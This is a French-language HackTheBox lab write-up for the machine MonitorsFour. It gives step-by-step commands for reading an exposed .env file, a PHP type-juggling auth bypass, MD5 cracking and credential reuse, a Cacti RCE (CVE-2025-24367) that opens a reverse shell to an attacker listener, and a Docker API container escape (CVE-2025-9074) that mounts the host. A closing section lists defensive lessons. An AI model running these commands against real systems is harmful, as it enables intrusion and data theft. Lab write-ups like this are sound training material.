# MonitorsFour - HackTheBox Write-up

![HTB](https://img.shields.io/badge/HackTheBox-MonitorsFour-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Windows%20%2B%20Docker-blue)

## Informations

| Attribut | Valeur |
|----------|--------|
| Machine | MonitorsFour |
| OS | Windows avec Docker Desktop / WSL2 |
| Difficulte | Medium |
| IP | 10.129.x.x |

## Sommaire

1. [Reconnaissance](#reconnaissance)
2. [Enumeration Web](#enumeration-web)
3. [Exploitation - PHP Type Juggling](#exploitation---php-type-juggling)
4. [Acces Cacti - Credential Reuse](#acces-cacti---credential-reuse)
5. [RCE via CVE-2025-24367](#rce-via-cve-2025-24367)
6. [Privilege Escalation - Docker Escape](#privilege-escalation---docker-escape)
7. [Conclusion](#conclusion)

---

## Reconnaissance

### Scan Nmap

```bash
nmap -T4 -sC -sV 10.129.x.x
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows
```

**Observations :**
- Port 80 : Serveur web Nginx avec redirection vers `monitorsfour.htb`
- Port 5985 : WinRM (Windows Remote Management)
- L'OS est Windows, mais la presence de Nginx suggere une architecture containerisee

### Configuration DNS

```bash
echo "10.129.x.x monitorsfour.htb" >> /etc/hosts
```

---

## Enumeration Web

### Decouverte de sous-domaines

```bash
ffuf -u "http://10.129.x.x/" -H "Host: FUZZ.monitorsfour.htb" \
  -w /path/to/subdomains-top1million-5000.txt -ac -mc 200,301,302
```

**Resultat :** `cacti.monitorsfour.htb` - Instance Cacti 1.2.28

### Enumeration des endpoints

```bash
ffuf -u "http://monitorsfour.htb/FUZZ" -w common.txt -ac -mc 200,301,302
```

**Decouvertes importantes :**

| Endpoint | Description |
|----------|-------------|
| `/.env` | Fichier de configuration expose |
| `/login` | Page de connexion |
| `/forgot-password` | Reset de mot de passe |
| `/api/v1/auth` | API d'authentification |
| `/api/v1/user` | API utilisateur |
| `/api/v1/users` | API liste utilisateurs |

### Fichier .env expose

```bash
curl -s "http://monitorsfour.htb/.env"
```

```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

---

## Exploitation - PHP Type Juggling

### Decouverte de la vulnerabilite

L'endpoint `/api/v1/user` demande un parametre `token` :

```bash
curl -s "http://monitorsfour.htb/user"
# {"error":"Missing token parameter"}

curl -s "http://monitorsfour.htb/user?token=test"
# {"error":"Invalid or missing token"}
```

### PHP Loose Comparison Bypass

En PHP, une comparaison "loose" (`==` au lieu de `===`) peut etre bypassee avec des "magic values". Les valeurs comme `0`, `0e0`, `0e12345` sont traitees comme `0` en notation scientifique.

```bash
curl -s "http://monitorsfour.htb/user?token=0"
```

**Resultat :** Dump complet des utilisateurs avec leurs hash MD5 !

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "name": "Marcus Higgins",
    "position": "System Administrator"
  },
  ...
]
```

### Cracking des hash MD5

```bash
echo "56b32eb43e6f15395f6c46c1c9e1cd36" > hashes.txt
hashcat -m 0 hashes.txt rockyou.txt
```

**Resultat :** `wonderful1`

---

## Acces Cacti - Credential Reuse

### Identification de la version Cacti

```bash
curl -s "http://cacti.monitorsfour.htb/cacti/" | grep -i version
# Version 1.2.28
```

### Connexion avec les credentials

Le nom "Marcus Higgins" suggere l'username `marcus` sur Cacti :

- **Username:** `marcus`
- **Password:** `wonderful1`

Connexion reussie au panel d'administration Cacti.

---

## RCE via CVE-2025-24367

### Description de la vulnerabilite

**CVE-2025-24367** (CVSS 7.2) : Une faille dans l'outil RRD de Cacti permet a un attaquant authentifie d'abuser de la fonctionnalite de creation de graphes pour ecrire des scripts PHP arbitraires dans le webroot.

### Exploitation

```bash
# Cloner le PoC
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git

# Terminal 1 : Listener
nc -lvnp 4444

# Terminal 2 : Exploit
cd CVE-2025-24367-Cacti-PoC
sudo python3 exploit.py -u marcus -p wonderful1 \
  -url http://cacti.monitorsfour.htb -i <VOTRE_IP> -l 4444
```

**Resultat :** Reverse shell en tant que `www-data` dans un container Docker.

```
www-data@821fbd6a43fa:~/html/cacti$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### User Flag

```bash
cat /home/marcus/user.txt
```

---

## Privilege Escalation - Docker Escape

### Identification de l'environnement

```bash
ls -la /.dockerenv  # Confirme qu'on est dans un container
cat /etc/hosts      # Revele la topologie reseau
```

### CVE-2025-9074 - Docker Desktop API Exposure

Docker Desktop 4.44.2 est vulnerable a **CVE-2025-9074** : l'API Docker Engine est accessible sans authentification depuis les containers Linux.

### Verification de l'API

```bash
curl -s http://192.168.65.7:2375/version
```

L'API repond - elle est accessible !

### Creation d'un container privilegie

```bash
# Creer un container avec le filesystem host monte
curl -s -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh"],
    "Tty": true,
    "OpenStdin": true,
    "HostConfig": {
      "Binds": ["/:/host"]
    }
  }'
# Retourne: {"Id":"CONTAINER_ID","Warnings":[]}

# Demarrer le container
curl -s -X POST http://192.168.65.7:2375/containers/CONTAINER_ID/start
```

### Navigation vers le flag root

Le systeme de fichiers Windows est accessible via WSL2 :

```bash
# Explorer la structure
/host/mnt/host/c/  # Lecteur C: Windows

# Lire le root flag
curl -s -X POST "http://192.168.65.7:2375/containers/CONTAINER_ID/exec" \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["cat","/host/mnt/host/c/Users/Administrator/Desktop/root.txt"],"AttachStdout":true,"AttachStderr":true}'

# Executer l'ID retourne
curl -s -X POST "http://192.168.65.7:2375/exec/EXEC_ID/start" \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":false}'
```

---

## Conclusion

### Chaine d'attaque

```
1. Enumeration web -> .env expose + subdomain cacti
                           |
2. PHP Type Juggling -> Bypass auth /user?token=0
                           |
3. Hash MD5 cracke -> marcus:wonderful1
                           |
4. CVE-2025-24367 -> RCE Cacti -> Shell www-data (Docker)
                           |
5. CVE-2025-9074 -> Docker API sans auth -> Container privilegie
                           |
6. Mount host filesystem -> Root flag Windows
```

### Vulnerabilites exploitees

| CVE | Nom | Impact |
|-----|-----|--------|
| N/A | PHP Type Juggling | Bypass d'authentification |
| N/A | .env expose | Fuite de credentials |
| CVE-2025-24367 | Cacti Graph Template RCE | Execution de code arbitraire |
| CVE-2025-9074 | Docker Desktop API Exposure | Escape de container |

### Lecons apprises

1. **Ne jamais exposer les fichiers de configuration** (`.env`, `config.php`)
2. **Utiliser des comparaisons strictes en PHP** (`===` au lieu de `==`)
3. **Mettre a jour les applications** (Cacti 1.2.28 -> 1.2.29+)
4. **Securiser l'API Docker** - ne jamais l'exposer sans authentification
5. **Principe du moindre privilege** - les containers ne devraient pas avoir acces a l'API Docker

### Outils utilises

- nmap, ffuf - Reconnaissance
- hashcat - Cracking de hash
- curl - Exploitation manuelle
- CVE-2025-24367-Cacti-PoC - Exploit Cacti
